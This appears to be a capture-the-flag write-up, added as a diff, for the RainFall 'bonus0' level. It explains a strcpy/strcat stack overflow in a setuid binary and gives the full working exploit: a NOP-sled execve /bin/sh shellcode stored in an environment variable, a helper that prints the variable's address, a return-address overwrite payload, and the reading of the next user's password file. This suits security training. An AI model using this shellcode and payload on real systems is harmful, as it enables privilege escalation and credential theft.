@@ -1,0 +1,42 @@
+There is a setuid binary "bonus0" own by bonus1
+
+After disassembling the binary we can see that pp() function
+call strcpy() without doing a bounds checking on str1 before copying its content in result buffer
+
+Resulting in overflow the result buffer.
+When str1 doesn't finish with a '\0' the first strcpy will copy str1 and str2 in result buffer
+
+then strcat will concatenate str2
+
+|-------------------------------------------------------------------------------|-----------|-----|
+|                                    54 Bytes                                   |  4 Bytes  | 1 B |
+| char                                                                  *result |  Return   |     |
+|                                                                               |  Address  |     |
+|-------------------------------------------------------------------------------|-----------|-----|
+|           20 Bytes           |          19 Bytes          |  1 B  |          19 Bytes           |
+|                         str1 |                       str2 |       |                        str2 |
+|                              |                            |  " "  |                             |
+|------------------------------|----------------------------|-------|-----------------------------|
+
+result = str + str2 + " " + str2
+Return Address = str[14:18]
+
+Here we will return to a SHELLCODE that we store in a environment variable
+bonus0@RainFall:~$> export SHELLCODE=`python -c 'print "\x90"*1000 +"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'`
+
+We can use a small program to print us the SHELLCODE environment variable
+bonus0@RainFall:~$> echo 'main(){printf("%p\n",getenv("SHELLCODE"));}' | gcc -xc - -o/tmp/a.out
+
+
+We prepend our SHELLCODE with a lot of NOP instruction to take in consideration that the address this SHELLCODE in the environment
+may be shifted in memory from a program to another
+
+So we just need to run the program with our payload,
+first 20 or more charaters
+then a string containing the address of the SHELLCODE variable at offset 14
+
+
+bonus0@RainFall:~$> (python -c 'print "Get me a shell pleas" '; python -c 'print "e i need it ! " + "\xa1\xf8\xff\xbf" + "!" '; cat -) | ./bonus0
+
+bonus1@RainFall:~$> cat ~bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
